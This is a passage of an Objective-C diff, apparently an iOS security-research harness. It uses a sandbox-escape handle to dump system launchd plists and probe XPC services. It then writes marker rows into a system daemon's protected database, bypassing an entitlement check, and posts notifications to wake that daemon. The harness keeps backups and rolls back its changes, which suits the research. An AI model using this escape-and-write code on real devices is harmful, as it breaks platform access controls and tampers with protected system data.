+        usleep(1000 * 1000);
+        struct stat cdb = {0}, cwal = {0}, cshm = {0};
+        BOOL any = NO;
+        if (stat(dbp.fileSystemRepresentation, &cdb) == 0 &&
+            (cdb.st_mtime != pDb.st_mtime || cdb.st_size != pDb.st_size)) {
+            LOG("[bq24] t=%ds DB  changed: mtime %lld->%lld size %lld->%lld",
+                t, (long long)pDb.st_mtime, (long long)cdb.st_mtime,
+                (long long)pDb.st_size, (long long)cdb.st_size);
+            pDb = cdb; any = YES;
+        }
+        if (stat(walp.fileSystemRepresentation, &cwal) == 0 &&
+            (cwal.st_mtime != pWal.st_mtime || cwal.st_size != pWal.st_size)) {
+            LOG("[bq24] t=%ds WAL changed: mtime %lld->%lld size %lld->%lld",
+                t, (long long)pWal.st_mtime, (long long)cwal.st_mtime,
+                (long long)pWal.st_size, (long long)cwal.st_size);
+            pWal = cwal; any = YES;
+        }
+        if (stat(shmPath.fileSystemRepresentation, &cshm) == 0 &&
+            (cshm.st_mtime != pShm.st_mtime || cshm.st_size != pShm.st_size)) {
+            LOG("[bq24] t=%ds SHM changed: mtime %lld->%lld size %lld->%lld",
+                t, (long long)pShm.st_mtime, (long long)cshm.st_mtime,
+                (long long)pShm.st_size, (long long)cshm.st_size);
+            pShm = cshm; any = YES;
+        }
+        if (any) {
+            changes++;
+            fsync(fileno(stderr));
+        }
+    }
+    dispatch_async(dispatch_get_main_queue(), ^{
+        [UIApplication sharedApplication].idleTimerDisabled = NO;
+    });
+
+    LOG("[bq24] done: %d s watched, %d file transitions", secs, changes);
+    bad_query_release(h);
+}
+
+// ---------------------------------------------------------------------------
+// V177 (p_bq25): how do the readers wake up.
+//
+// bq22's readers are thin shells over IntelligenceFlow*Runtime; the
+// ContextRuntime carve (bq21) contains its own mach service names
+// (com.apple.intelligencecontextd, com.apple.intelligenceflow
+// .intelligencecontextd) and ProactiveDaemonSupport — so activation
+// is decided by the launchd plists (MachServices = on-demand by XPC,
+// RunAtLoad/KeepAlive = always, WatchPaths = event-driven). The
+// plists live ONLY on the device (/System/Library/LaunchDaemons is
+// readable — bq16 scanned it for the service's label already).
+//
+// Dump every plist whose raw bytes mention the readers/owners —
+// content included, these are tiny text files. Controls: escape
+// handle; total read/denied counters; at least one known label
+// (LiveEntityService — found by bq16) must reappear or the matcher
+// is broken (§144).
+// ---------------------------------------------------------------------------
+
+static void p_bq25(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    LOG("[bq25] v177 activation: launchd plist dump for readers");
+
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq25] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE — aborting ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) { LOG("[bq25] done"); return; }
+
+    const char *needles[] = { "ntelligence",   // Intelligence/intelligence
+                              "LiveEntit",     // LiveEntityService + lib
+                              "live-entit" };  // entitlement keys in plists
+    const unsigned nneedles = 3;
+    const char *roots[] = { "/System/Library/LaunchDaemons",
+                            "/System/Library/LaunchAgents",
+                            "/Library/LaunchDaemons",
+                            "/Library/LaunchAgents" };
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+    int total = 0, denied = 0, hits = 0, dumped = 0;
+
+    for (unsigned r = 0; r < sizeof(roots) / sizeof(roots[0]); r++) {
+        DIR *d = opendir(roots[r]);
+        if (!d) {
+            // "missing" is not "denied": /Library/Launch{Daemons,Agents}
+            // simply do not exist on this build (bq16 scanned only the
+            // two /System roots — that is where the old baseline of
+            // 661 read / 0 denied came from).
+            struct stat rst;
+            if (stat(roots[r], &rst) != 0)
+                LOG("[bq25] root %s: missing", roots[r]);
+            else {
+                LOG("[bq25] root %s: DENIED (errno %d)", roots[r], errno);
+                denied++;
+            }
+            continue;
+        }
+        LOG("[bq25] root %s: opened", roots[r]);
+        fsync(fileno(stderr));
+        struct dirent *e;
+        int seen = 0, opened = 0;
+        while ((e = readdir(d))) {
+            if (e->d_name[0] == '.') continue;
+            // bq16's proven filter: plists only — a non-plist entry
+            // (fifo/socket/whatever) is where two runs of this phase
+            // vanished without a trace before any logging happened.
+            if (!strstr(e->d_name, ".plist")) {
+                LOG("[bq25]   skip non-plist: %s", e->d_name);
+                fsync(fileno(stderr));
+                continue;
+            }
+            seen++;
+            if (seen <= 5 || seen % 50 == 0) {
+                LOG("[bq25]   entry#%d %s: opening", seen, e->d_name);
+                fsync(fileno(stderr));
+            }
+            char p[1400];
+            snprintf(p, sizeof(p), "%s/%s", roots[r], e->d_name);
+            int fd = open(p, O_RDONLY | O_NONBLOCK);
+            if (fd < 0) {
+                LOG("[bq25]   entry#%d open errno %d", seen, errno);
+                fsync(fileno(stderr));
+                denied++;
+                continue;
+            }
+            struct stat st;
+            fstat(fd, &st);
+            if (!S_ISREG(st.st_mode) || st.st_size <= 0 ||
+                st.st_size > (4 << 20)) {
+                close(fd);
+                continue;
+            }
+            opened++;
+            char *buf = (char *)malloc((size_t)st.st_size + 1);
+            ssize_t n = read(fd, buf, (size_t)st.st_size);
+            close(fd);
+            if (n <= 0) {
+                if (seen <= 5) {
+                    LOG("[bq25]   entry#%d read=%zd", seen, n);
+                    fsync(fileno(stderr));
+                }
+                free(buf);
+                continue;
+            }
+            buf[n] = 0;
+            total++;
+            NSMutableString *matched = [NSMutableString string];
+            for (unsigned k = 0; k < nneedles; k++)
+                if (memmem(buf, (size_t)n, needles[k], strlen(needles[k]))) {
+                    // NB: no `cond ? @"," : ""` ternary here — mixing
+                    // NSString* and char* in a ternary silently picks
+                    // char*, and %@ then dereferences it as an object.
+                    if (matched.length) [matched appendString:@","];
+                    [matched appendFormat:@"%s", needles[k]];
+                }
+            if (matched.length) {
+                hits++;
+                LOG("[bq25] HIT %s <- [%s]", p, matched.UTF8String);
+                fsync(fileno(stderr));
+                NSString *dst = [docs stringByAppendingPathComponent:
+                    [NSString stringWithFormat:@"plist-%d-%s", hits,
+                     e->d_name]];
+                [[NSData dataWithBytes:buf length:(NSUInteger)n]
+                    writeToFile:dst atomically:NO];
+                dumped++;
+            }
+            free(buf);
+        }
+        closedir(d);
+        LOG("[bq25] root %s finished: seen=%d opened=%d", roots[r], seen,
+            opened);
+        fsync(fileno(stderr));
+    }
+    // Baseline control: bq16 walked the same roots and read 661
+    // plists with 0 denied — a much smaller count means the walker
+    // is broken and every "no hit" below would be a false negative.
+    LOG("[bq25] total=%d denied=%d hits=%d dumped=%d "
+        "CONTROL baseline(661 read/0 denied)=%s", total, denied, hits,
+        dumped, (total >= 500 && denied == 0) ? "OK" : "BROKEN");
+    if (total < 500 || denied != 0)
+        LOG("[bq25] DETECTOR CONTROL FAILED — hits/misses NOT a verdict");
+    fsync(fileno(stderr));
+
+    bad_query_release(h);
+    LOG("[bq25] done");
+}
+
+// ---------------------------------------------------------------------------
+// V177 (p_bq26): can WE wake the reader ourselves?
+//
+// bq25's dump of com.apple.intelligencecontextd.plist shows the job
+// carries MachService com.apple.intelligenceflow.entity-feeds-update
+// — the "feed was updated" entry point that (per its name) makes the
+// reader boot on demand. All prior observation windows were silent
+// because our direct FILE write posts no mach notification: readers
+// wake only from a real producer's XPC write. If launchd lets THIS
+// app look up those names, we can trigger the read chain ourselves;
+// if not, the denial is a fact for the journal (and the trigger must
+// come from a real producer event).
+//
+// Control (§144): com.apple.appintents.LiveEntityService must fail
+// exactly like bq19 ("Connection invalid") — if THAT name suddenly
+// resolves, the detector is lying about the new names too. No DB
+// writes in this phase at all: a pure connection probe.
+// ---------------------------------------------------------------------------
+
+static void p_bq26(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    LOG("[bq26] v177 mach-lookup probe: reader wake-up names");
+
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq26] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE — aborting ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) { LOG("[bq26] done"); return; }
+
+    const char *svcNames[] = {
+        "com.apple.intelligenceflow.entity-feeds-update", // reader's feed hook
+        "com.apple.intelligenceflow.context",
+        "com.apple.intelligenceflow.transcript-entity-querying",
+        // Control: bq19 proved this one is denied ("Connection
+        // invalid") — it must fail the same way here.
+        "com.apple.appintents.LiveEntityService",
+    };
+    const unsigned nsvc = 4;
+
+    dispatch_queue_t q = dispatch_queue_create("bq26.xpc",
+        DISPATCH_QUEUE_SERIAL);
+    __block int errCount = 0;
+    xpc_connection_t conns[4] = { NULL, NULL, NULL, NULL };
+    // heap array, not a stack array: block capture of an array type is
+    // a compile error, a captured pointer works.
+    const char **evSeen = (const char **)calloc(nsvc, sizeof(char *));
+    for (unsigned i = 0; i < nsvc; i++) {
+        xpc_connection_t c = xpc_connection_create(svcNames[i], q);
+        if (!c) {
+            LOG("[bq26] create(%s) -> NULL", svcNames[i]);
+            continue;
+        }
+        conns[i] = c;
+        const char *nm = svcNames[i];
+        unsigned idx = i;
+        xpc_connection_set_event_handler(c, ^(xpc_object_t ev) {
+            char *ds = xpc_copy_description(ev);
+            LOG("[bq26] XPC[%s] event: %s", nm, ds ?: "?");
+            if (xpc_get_type(ev) == XPC_TYPE_ERROR) {
+                __sync_fetch_and_add(&errCount, 1);
+                evSeen[idx] = "error";
+            } else {
+                evSeen[idx] = "reply";
+            }
+            free(ds);
+            fsync(fileno(stderr));
+        });
+        xpc_connection_resume(c);
+        LOG("[bq26] XPC[%s] resume", svcNames[i]);
+    }
+    fsync(fileno(stderr));
+
+    // Force the lookup: sending makes launchd do the policy check.
+    usleep(500 * 1000);
+    for (unsigned i = 0; i < nsvc; i++) {
+        if (!conns[i]) continue;
+        xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(msg, "method", "ping");
+        xpc_connection_send_message(conns[i], msg);
+    }
+    sleep(3);
+    for (unsigned i = 0; i < nsvc; i++)
+        LOG("[bq26] RESULT %s -> %s", svcNames[i],
+            evSeen[i] ? evSeen[i] : "no-event-yet");
+    LOG("[bq26] errors=%d (control: LiveEntityService must be an error, "
+        "as in bq19)", errCount);
+    fsync(fileno(stderr));
+    free(evSeen);
+
+    bad_query_release(h);
+    LOG("[bq26] done");
+}
+
+// ---------------------------------------------------------------------------
+// V177 (p_bq27): markers + long watch + real user events (§175/§184).
+//
+// bq23 showed a 90 s window with our own looping tone sees nothing;
+// bq24 showed 900 s of passive watching sees nothing either, yet the
+// store's live rows carry the CURRENT bootId (one real write at
+// +03:25 local since the ~00:53 boot) — producers fire rarely and
+// only on REAL events. bq26 proved this app cannot wake the reader
+// itself (all four intelligenceflow mach names: "Connection invalid",
+// control == bq19). So this phase combines bq23's two-row oracle with
+// bq24's watcher over a longer window while the operator performs
+// producer events on the device (alarm create/toggle, real music,
+// Siri query, running timer):
+//
+//   - oracle row (foreign bootId) — must vanish IF the owner runs
+//     its bootId cleanup when the store is next touched;
+//   - control row (real bootId) — must survive that cleanup; if it
+//     disappears too, the whole table was reset (different verdict);
+//   - file transitions (db/wal/shm mtime/size) — writer activity;
+//   - every transition is timestamped against the iteration number,
+//     so an operator action inside the window is correlatable.
+//
+// Controls (§144): escape handle; row counts + real bootId read from
+// the table; verified byte-backup BEFORE insert; INSERT failure =>
+// ROLLBACK (zero changes); quiet-wait before restore (don't race a
+// live writer); final byte-identical check; heartbeat every 60 s so a
+// hung watcher is distinguishable from a quiet store.
+// ---------------------------------------------------------------------------
+
+static void p_bq27(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    int secs = getenv("FUZZ_BQ27_SECS") ? atoi(getenv("FUZZ_BQ27_SECS")) : 600;
+    if (secs < 10) secs = 10;
+    LOG("[bq27] v177 markers + watch, %d s (user events expected in window)",
+        secs);
+
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq27] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE — aborting ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) { LOG("[bq27] done"); return; }
+
+    NSString *dir = @"/var/containers/Data/System/"
+        "8EB68272-6502-49E9-B688-25CA4774CFE4";
+    NSString *dbp = [dir stringByAppendingPathComponent:@"db"];
+    NSString *walp = [dbp stringByAppendingString:@"-wal"];
+    NSString *shmPath = [dbp stringByAppendingString:@"-shm"];
+    NSArray *files = @[ dbp, walp, shmPath ];
+
+    struct stat st = {0};
+    if (stat(dbp.fileSystemRepresentation, &st) != 0) {
+        LOG("[bq27] CONTROL db stat errno %d — aborting, target gone", errno);
+        bad_query_release(h); LOG("[bq27] done"); return;
+    }
+    sqlite3 *db = NULL;
+    if (sqlite3_open_v2(dbp.UTF8String, &db, SQLITE_OPEN_READONLY,
+                        NULL) != SQLITE_OK) {
+        LOG("[bq27] CONTROL readonly open failed — aborting");
+        if (db) sqlite3_close(db);
+        bad_query_release(h); LOG("[bq27] done"); return;
+    }
+    int ent0 = bq18_count(db, "SELECT count(*) FROM feedEntries");
+    int meta0 = bq18_count(db, "SELECT count(*) FROM feedMetadata");
+    NSString *realBoot = nil;
+    sqlite3_stmt *q = NULL;
+    if (sqlite3_prepare_v2(db,
+            "SELECT bootId FROM feedEntries "
+            "WHERE bootId NOT LIKE 'FZ29%' LIMIT 1", -1, &q, NULL)
+            == SQLITE_OK && sqlite3_step(q) == SQLITE_ROW) {
+        const char *b = (const char *)sqlite3_column_text(q, 0);
+        if (b) realBoot = [NSString stringWithUTF8String:b];
+    }
+    if (q) sqlite3_finalize(q);
+    LOG("[bq27] CONTROL rows: feedEntries=%d feedMetadata=%d realBootId=%s",
+        ent0, meta0, realBoot ? realBoot.UTF8String : "(none!)");
+    fsync(fileno(stderr));
+    sqlite3_close(db);
+    if (ent0 < 0 || meta0 < 0 || !realBoot) {
+        LOG("[bq27] CONTROL incomplete — no blind INSERT");
+        bad_query_release(h); LOG("[bq27] done"); return;
+    }
+
+    // ---- BACKUP
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+    NSString *bdir = [docs stringByAppendingPathComponent:@"bq27-backup"];
+    [[NSFileManager defaultManager] removeItemAtPath:bdir error:NULL];
+    [[NSFileManager defaultManager] createDirectoryAtPath:bdir
+        withIntermediateDirectories:YES attributes:nil error:NULL];
+    BOOL backupOK = YES;
+    for (NSString *f in files) {
+        struct stat fs2;
+        if (stat(f.fileSystemRepresentation, &fs2) != 0) {
+            LOG("[bq27] BACKUP absent: %s", f.lastPathComponent.UTF8String);
+            continue;
+        }
+        NSString *dst = [bdir stringByAppendingPathComponent:
+            f.lastPathComponent];
+        if (!bq18_copy(f, dst) || !bq18_same(f, dst)) {
+            backupOK = NO;
+            LOG("[bq27] BACKUP FAIL for %s", f.lastPathComponent.UTF8String);
+        }
+    }
+    LOG("[bq27] BACKUP %s", backupOK ? "verified" : "BROKEN");
+    fsync(fileno(stderr));
+    if (!backupOK) {
+        LOG("[bq27] no verified backup — refusing to write");
+        bad_query_release(h); LOG("[bq27] done"); return;
+    }
+
+    // ---- CHANGE (bq23's two rows, same live-schema walk)
+    sqlite3 *wdb = NULL;
+    if (sqlite3_open_v2(dbp.UTF8String, &wdb, SQLITE_OPEN_READWRITE,
+                        NULL) != SQLITE_OK) {
+        LOG("[bq27] WRITE open failed (%s) — route closed",
+            wdb ? sqlite3_errmsg(wdb) : "?");
+        if (wdb) sqlite3_close(wdb);
+        bad_query_release(h); LOG("[bq27] done"); return;
+    }
+    NSMutableArray *entCols = [NSMutableArray array];
+    sqlite3_stmt *ti = NULL;
+    if (sqlite3_prepare_v2(wdb, "PRAGMA table_info(feedEntries)", -1, &ti,
+                           NULL) == SQLITE_OK)
+        while (sqlite3_step(ti) == SQLITE_ROW)
+            [entCols addObject:[NSString stringWithUTF8String:
+                (const char *)sqlite3_column_text(ti, 1)]];
+    if (ti) sqlite3_finalize(ti);
+    if (entCols.count == 0) {
+        LOG("[bq27] schema unreadable — aborting, no blind INSERT");
+        sqlite3_close(wdb);
+        bad_query_release(h); LOG("[bq27] done"); return;
+    }
+    NSString *(^valFor)(NSString *, NSString *, NSString *) =
+        ^NSString *(NSString *col, NSString *feed, NSString *boot) {
+        if ([col isEqualToString:@"feedId"])    return feed;
+        if ([col isEqualToString:@"bootId"])    return boot;
+        if ([col isEqualToString:@"bundleId"])  return @"com.fz29.probe";
+        if ([col hasPrefix:@"entity"] || [col hasPrefix:@"Entity"])
+            return @"FZ29Oracle/fz29";
+        if ([col isEqualToString:@"lastUpdate"])
+            return @"2099-01-01T00:00:00.000";
+        if ([col isEqualToString:@"lnValue"])   return @"fz29-oracle";
+        if ([col isEqualToString:@"metadata"])  return nil;
+        return @"fz29";
+    };
+    NSMutableString *cols = [NSMutableString string];
+    for (NSString *c in entCols)
+        [cols appendFormat:@"%@%@", cols.length ? @"," : @"", c];
+    NSString *(^insSQL)(NSString *, NSString *) =
+        ^NSString *(NSString *feed, NSString *boot) {
+        NSMutableString *vals = [NSMutableString string];
+        for (NSString *c in entCols) {
+            NSString *v = valFor(c, feed, boot);
+            [vals appendFormat:@"%@%@", vals.length ? @"," : @"",
+                v ? [NSString stringWithFormat:@"'%@'", v] : @"NULL"];
+        }
+        return [NSString stringWithFormat:
+            @"INSERT INTO feedEntries (%@) VALUES (%@)", cols, vals];
+    };
+    NSString *insO = insSQL(@"fz29.noboot", @"FZ29-NOBOOT-ORACLE");
+    NSString *insC = insSQL(@"fz29.bootok", realBoot);
+
+    char *err = NULL;
+    int changed = 0;
+    sqlite3_exec(wdb, "BEGIN IMMEDIATE", NULL, NULL, &err);
+    int rc1 = sqlite3_exec(wdb, insO.UTF8String, NULL, NULL, &err);
+    int rc2 = rc1 == SQLITE_OK
+        ? sqlite3_exec(wdb, insC.UTF8String, NULL, NULL, &err) : rc1;
+    if (rc2 == SQLITE_OK) changed = 1;
+    else LOG("[bq27] WRITE rc=%d: %s", rc2, err ?: "?");
+    if (err) { sqlite3_free(err); err = NULL; }
+    if (!changed) {
+        sqlite3_exec(wdb, "ROLLBACK", NULL, NULL, NULL);
+        LOG("[bq27] WRITE rolled back — zero changes left");
+    } else {
+        sqlite3_exec(wdb, "COMMIT", NULL, NULL, NULL);
+        LOG("[bq27] WRITE committed: oracle=1 control=1 (t=0 marker set)");
+    }
+    fsync(fileno(stderr));
+
+    // ---- WATCH (bq24's three-file stat + row presence, 1 Hz)
+    int fileChanges = 0, oracleGone = -1, ctrlGone = -1;
+    if (changed) {
+        dispatch_async(dispatch_get_main_queue(), ^{
+            [UIApplication sharedApplication].idleTimerDisabled = YES;
+        });
+        struct stat pDb = {0}, pWal = {0}, pShm = {0};
+        stat(dbp.fileSystemRepresentation, &pDb);
+        stat(walp.fileSystemRepresentation, &pWal);
+        stat(shmPath.fileSystemRepresentation, &pShm);
+        for (int t = 0; t < secs; t++) {
+            usleep(1000 * 1000);
+            if (t > 0 && t % 60 == 0) {
+                LOG("[bq27] heartbeat t=%ds (store quiet so far: changes=%d "
+                    "oracle=%s control=%s)", t, fileChanges,
+                    oracleGone < 0 ? "alive" : "GONE",
+                    ctrlGone < 0 ? "alive" : "GONE");
+                fsync(fileno(stderr));
+            }
+            struct stat cdb = {0}, cwal = {0}, cshm = {0};
+            BOOL any = NO;
+            if (stat(dbp.fileSystemRepresentation, &cdb) == 0 &&
+                (cdb.st_mtime != pDb.st_mtime || cdb.st_size != pDb.st_size)) {
+                LOG("[bq27] t=%ds DB changed: mtime %lld->%lld size %lld->%lld",
+                    t, (long long)pDb.st_mtime, (long long)cdb.st_mtime,
+                    (long long)pDb.st_size, (long long)cdb.st_size);
+                pDb = cdb; any = YES;
+            }
+            if (stat(walp.fileSystemRepresentation, &cwal) == 0 &&
+                (cwal.st_mtime != pWal.st_mtime || cwal.st_size != pWal.st_size)) {
+                LOG("[bq27] t=%ds WAL changed: mtime %lld->%lld size %lld->%lld%s",
+                    t, (long long)pWal.st_mtime, (long long)cwal.st_mtime,
+                    (long long)pWal.st_size, (long long)cwal.st_size,
+                    oracleGone < 0 ? "" : " [after oracle gone]");
+                pWal = cwal; any = YES;
+            }
+            if (stat(shmPath.fileSystemRepresentation, &cshm) == 0 &&
+                (cshm.st_mtime != pShm.st_mtime || cshm.st_size != pShm.st_size)) {
+                LOG("[bq27] t=%ds SHM changed: mtime %lld->%lld size %lld->%lld",
+                    t, (long long)pShm.st_mtime, (long long)cshm.st_mtime,
+                    (long long)pShm.st_size, (long long)cshm.st_size);
+                pShm = cshm; any = YES;
+            }
+            if (any) fileChanges++;
+            if (any && fileChanges == 1) {
+                LOG("[bq27] t=%ds first store change — dumping rows", t);
+                bq27_dump_rows(wdb, "bq27@change");
+            }
+            int o = bq18_count(wdb, "SELECT count(*) FROM feedEntries "
+                                    "WHERE feedId='fz29.noboot'");
+            int c = bq18_count(wdb, "SELECT count(*) FROM feedEntries "
+                                    "WHERE feedId='fz29.bootok'");
+            if (o == 0 && oracleGone < 0) {
+                oracleGone = t;
+                LOG("[bq27] t=%ds ORACLE ROW DELETED BY THE SERVICE "
+                    "(bootId cleanup ran)", t);
+            }
+            if (c == 0 && ctrlGone < 0) {
+                ctrlGone = t;
+                LOG("[bq27] t=%ds CONTROL ROW ALSO DELETED — table reset, "
+                    "not bootId cleanup!", t);
+            }
+            if (any || o == 0 || c == 0) fsync(fileno(stderr));
+        }
+        dispatch_async(dispatch_get_main_queue(), ^{
+            [UIApplication sharedApplication].idleTimerDisabled = NO;
+        });
+        LOG("[bq27] watch done: changes=%d oracleGone=%d ctrlGone=%d/%d",
+            fileChanges, oracleGone, ctrlGone, secs);
+        fsync(fileno(stderr));
+    }
+
+    // ---- ROLLBACK (bq23's quiet-wait + byte restore)
+    int quiet = 0;
+    for (int i = 0; i < 10 && quiet < 3; i++) {
+        struct stat a = {0}, b2 = {0};
+        stat(dbp.fileSystemRepresentation, &a);
+        usleep(1000 * 1000);
+        stat(dbp.fileSystemRepresentation, &b2);
+        quiet = (a.st_mtime == b2.st_mtime && a.st_size == b2.st_size)
+            ? quiet + 1 : 0;
+    }
+    if (changed) {
+        LOG("[bq27] final row dump before rollback");
+        bq27_dump_rows(wdb, "bq27@final");
+        sqlite3_exec(wdb, "DELETE FROM feedEntries WHERE feedId IN "
+                     "('fz29.noboot','fz29.bootok')", NULL, NULL, NULL);
+        sqlite3_exec(wdb, "COMMIT", NULL, NULL, NULL);
+    }
+    sqlite3_close(wdb);
+
+    BOOL bytesBack = YES;
+    for (NSString *f in files) {
+        struct stat fs2;
+        if (stat(f.fileSystemRepresentation, &fs2) != 0) continue;
+        NSString *bak = [bdir stringByAppendingPathComponent:
+            f.lastPathComponent];
+        if (!bq18_same(f, bak)) {
+            if (!bq18_copy(bak, f)) {
+                bytesBack = NO;
+                LOG("[bq27] RESTORE FAIL %s", f.lastPathComponent.UTF8String);
+            }
+        }
+    }
+    NSString *jrnl = [dbp stringByAppendingString:@"-journal"];
+    [[NSFileManager defaultManager] removeItemAtPath:jrnl error:NULL];
+    int ent1 = -1, meta1 = -1;
+    sqlite3 *vdb = NULL;
+    if (sqlite3_open_v2(dbp.UTF8String, &vdb, SQLITE_OPEN_READONLY,
+                        NULL) == SQLITE_OK) {
+        ent1 = bq18_count(vdb, "SELECT count(*) FROM feedEntries");
+        meta1 = bq18_count(vdb, "SELECT count(*) FROM feedMetadata");
+        sqlite3_close(vdb);
+    }
+    bytesBack = bytesBack &&
+        bq18_same(dbp, [bdir stringByAppendingPathComponent:@"db"]);
+    LOG("[bq27] VERIFY rows back: feedEntries=%d/%d feedMetadata=%d/%d "
+        "bytes-identical=%d", ent0, ent1, meta0, meta1, bytesBack ? 1 : 0);
+
+    const char *verdict;
+    if (changed && ctrlGone >= 0)
+        verdict = "TABLE RESET (control gone) — interpret manually";
+    else if (changed && oracleGone >= 0)
+        verdict = "POSITIVE: cleanup ran over our rows — activity oracle WORKS";
+    else
+        verdict = "INCONCLUSIVE: no cleanup (store may still have been "
+                  "written — see file transitions above)";
+    LOG("[bq27] VERDICT: %s", verdict);
+
+    bad_query_release(h);
+    LOG("[bq27] done");
+}
+
+// ---------------------------------------------------------------------------
+// V177 (p_bq28): wake the reader with a Darwin notification.
+//
+// Offline RE of svc.bin (bq20 dump) found the missing link of the
+// read chain: after processing a producer's XPC write the service
+// posts `com.apple.intelligencecontextd.entity-feeds-updated`
+// (adjacent string: "The client process is not entitled to update "
+// — the XPC write path checks live-entities.write, the file path
+// does not, §185). That post is what wakes the reader; our direct
+// FILE writes bypass it, which is why bq18/19/23/24/27 all saw
+// silence.
+//
+// If launchd/sandbox lets THIS app post that name, we can trigger
+// the consumer ourselves — no producer event needed. If it lets us
+// OBSERVE it, every real producer write becomes a real-time signal
+// (oracle check immediately after the ping).
+//
+// Probes, all raw status codes logged (the verdict is the code):
+//   1. own name: register_observe + post + notify_check — proves the
+//      detector works on known input (§144);
+//   2. target name: register_observe (passive listen);
+//   3. target name: post ×3 with the oracle/control markers in place.
+//
+// Safety: NO notify_set_state on foreign names (would scribble on
+// contextd's state), NO system names with side effects — only our
+// own test name and the one target. Markers + byte-exact rollback
+// exactly as bq27.
+// ---------------------------------------------------------------------------
+
+static void p_bq28(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    LOG("[bq28] v177 notify probe: wake intelligencecontextd ourselves");
+
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq28] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE — aborting ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) { LOG("[bq28] done"); return; }
+
+    const char *target = "com.apple.intelligencecontextd.entity-feeds-updated";
+    const char *own = "com.fz29.bq28.test";
+
+    // ---- probe 1: detector self-test on OUR name (§144)
+    int tokOwn = -1, st1 = -1;
+    st1 = notify_register_check(own, &tokOwn);
+    int stPostOwn = -1, chk = -1;
+    if (st1 == 0) {
+        stPostOwn = notify_post(own);
+        int c0 = -1;
+        notify_check(tokOwn, &c0);
+        usleep(200 * 1000);
+        notify_check(tokOwn, &chk);
+        LOG("[bq28] SELFTEST register=%d post=%d check0=%d check1=%d%s",
+            st1, stPostOwn, c0, chk,
+            (stPostOwn == 0 && chk == 1) ? " — detector OK"
+                                         : " — DETECTOR FAILED");
+    } else {
+        LOG("[bq28] SELFTEST register failed %d — notify denied outright",
+            st1);
+    }
+    fsync(fileno(stderr));
+
+    // ---- probe 2: passive listen on the target
+    int tokTgt = -1, stTgt = -1;
+    stTgt = notify_register_check(target, &tokTgt);
+    LOG("[bq28] target register_observe -> %d%s", stTgt,
+        stTgt == 0 ? " (listening)" : " (denied — no real-time signal)");
+    fsync(fileno(stderr));
+
+    // ---- markers (bq27 pattern)
+    NSString *dir = @"/var/containers/Data/System/"
+        "8EB68272-6502-49E9-B688-25CA4774CFE4";
+    NSString *dbp = [dir stringByAppendingPathComponent:@"db"];
+    NSString *walp = [dbp stringByAppendingString:@"-wal"];
+    NSString *shmPath = [dbp stringByAppendingString:@"-shm"];
+    NSArray *files = @[ dbp, walp, shmPath ];
+    struct stat st = {0};
+    if (stat(dbp.fileSystemRepresentation, &st) != 0) {
+        LOG("[bq28] CONTROL db stat errno %d — target gone", errno);
+        bad_query_release(h); LOG("[bq28] done"); return;
+    }
+    sqlite3 *db = NULL;
+    if (sqlite3_open_v2(dbp.UTF8String, &db, SQLITE_OPEN_READONLY,
+                        NULL) != SQLITE_OK) {
+        LOG("[bq28] CONTROL readonly open failed — aborting");
+        if (db) sqlite3_close(db);
+        bad_query_release(h); LOG("[bq28] done"); return;
+    }
+    int ent0 = bq18_count(db, "SELECT count(*) FROM feedEntries");
+    int meta0 = bq18_count(db, "SELECT count(*) FROM feedMetadata");
+    NSString *realBoot = nil;
+    sqlite3_stmt *q = NULL;
+    if (sqlite3_prepare_v2(db,
+            "SELECT bootId FROM feedEntries "
+            "WHERE bootId NOT LIKE 'FZ29%' LIMIT 1", -1, &q, NULL)
+            == SQLITE_OK && sqlite3_step(q) == SQLITE_ROW) {
+        const char *b = (const char *)sqlite3_column_text(q, 0);
+        if (b) realBoot = [NSString stringWithUTF8String:b];
+    }
+    if (q) sqlite3_finalize(q);
+    LOG("[bq28] CONTROL rows: feedEntries=%d feedMetadata=%d realBootId=%s",
+        ent0, meta0, realBoot ? realBoot.UTF8String : "(none!)");
+    fsync(fileno(stderr));
+    sqlite3_close(db);
+    if (ent0 < 0 || meta0 < 0 || !realBoot) {
+        LOG("[bq28] CONTROL incomplete — no blind INSERT");
+        if (tokTgt >= 0) notify_cancel(tokTgt);
+        if (tokOwn >= 0) notify_cancel(tokOwn);
+        bad_query_release(h); LOG("[bq28] done"); return;
+    }
+
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+    NSString *bdir = [docs stringByAppendingPathComponent:@"bq28-backup"];
+    [[NSFileManager defaultManager] removeItemAtPath:bdir error:NULL];
+    [[NSFileManager defaultManager] createDirectoryAtPath:bdir
+        withIntermediateDirectories:YES attributes:nil error:NULL];
+    BOOL backupOK = YES;
+    for (NSString *f in files) {
+        struct stat fs2;
